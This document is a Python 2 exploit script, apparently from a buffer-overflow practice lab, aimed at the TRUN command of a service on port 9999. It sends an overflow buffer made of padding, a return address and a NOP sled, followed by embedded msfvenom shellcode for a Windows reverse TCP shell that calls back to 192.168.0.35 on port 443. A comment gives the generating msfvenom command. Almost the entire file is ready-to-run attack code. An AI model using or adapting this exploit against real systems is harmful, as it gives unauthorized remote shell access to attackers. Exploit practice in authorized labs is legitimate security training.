#!/usr/bin/python
import sys, socket

ip = '192.168.0.37'
port = 9999


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.35 LPORT=443 -b '\x00' -f python -v shellcode

shellcode =  ""
shellcode += "\xb8\xd8\xcd\xaf\xe5\xdb\xc8\xd9\x74\x24\xf4\x5f"
shellcode += "\x33\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x37"
shellcode += "\x31\x4d\x10\x3b\x22\x10\xdb\xc3\xb3\x75\x55\x26"
shellcode += "\x82\xb5\x01\x23\xb5\x05\x41\x61\x3a\xed\x07\x91"
shellcode += "\xc9\x83\x8f\x96\x7a\x29\xf6\x99\x7b\x02\xca\xb8"
shellcode += "\xff\x59\x1f\x1a\xc1\x91\x52\x5b\x06\xcf\x9f\x09"
shellcode += "\xdf\x9b\x32\xbd\x54\xd1\x8e\x36\x26\xf7\x96\xab"
shellcode += "\xff\xf6\xb7\x7a\x8b\xa0\x17\x7d\x58\xd9\x11\x65"
shellcode += "\xbd\xe4\xe8\x1e\x75\x92\xea\xf6\x47\x5b\x40\x37"
shellcode += "\x68\xae\x98\x70\x4f\x51\xef\x88\xb3\xec\xe8\x4f"
shellcode += "\xc9\x2a\x7c\x4b\x69\xb8\x26\xb7\x8b\x6d\xb0\x3c"
shellcode += "\x87\xda\xb6\x1a\x84\xdd\x1b\x11\xb0\x56\x9a\xf5"
shellcode += "\x30\x2c\xb9\xd1\x19\xf6\xa0\x40\xc4\x59\xdc\x92"
shellcode += "\xa7\x06\x78\xd9\x4a\x52\xf1\x80\x02\x97\x38\x3a"
shellcode += "\xd3\xbf\x4b\x49\xe1\x60\xe0\xc5\x49\xe8\x2e\x12"
shellcode += "\xad\xc3\x97\x8c\x50\xec\xe7\x85\x96\xb8\xb7\xbd"
shellcode += "\x3f\xc1\x53\x3d\xbf\x14\xf3\x6d\x6f\xc7\xb4\xdd"
shellcode += "\xcf\xb7\x5c\x37\xc0\xe8\x7d\x38\x0a\x81\x14\xc3"
shellcode += "\xdd\x6e\x40\xcb\x3e\x07\x93\xcb\x41\x6c\x1a\x2d"
shellcode += "\x2b\x82\x4b\xe6\xc4\x3b\xd6\x7c\x74\xc3\xcc\xf9"
shellcode += "\xb6\x4f\xe3\xfe\x79\xb8\x8e\xec\xee\x48\xc5\x4e"
shellcode += "\xb8\x57\xf3\xe6\x26\xc5\x98\xf6\x21\xf6\x36\xa1"
shellcode += "\x66\xc8\x4e\x27\x9b\x73\xf9\x55\x66\xe5\xc2\xdd"
shellcode += "\xbd\xd6\xcd\xdc\x30\x62\xea\xce\x8c\x6b\xb6\xba"
shellcode += "\x40\x3a\x60\x14\x27\x94\xc2\xce\xf1\x4b\x8d\x86"
shellcode += "\x84\xa7\x0e\xd0\x88\xed\xf8\x3c\x38\x58\xbd\x43"
shellcode += "\xf5\x0c\x49\x3c\xeb\xac\xb6\x97\xaf\xdd\xfc\xb5"
shellcode += "\x86\x75\x59\x2c\x9b\x1b\x5a\x9b\xd8\x25\xd9\x29"
shellcode += "\xa1\xd1\xc1\x58\xa4\x9e\x45\xb1\xd4\x8f\x23\xb5"
shellcode += "\x4b\xaf\x61"


buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + shellcode

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send(('TRUN /.:/' + buffer))
	print "[*] Sending buffer, check netcat."
	s.close()

except:
	print "[!] Error."
	sys.exit()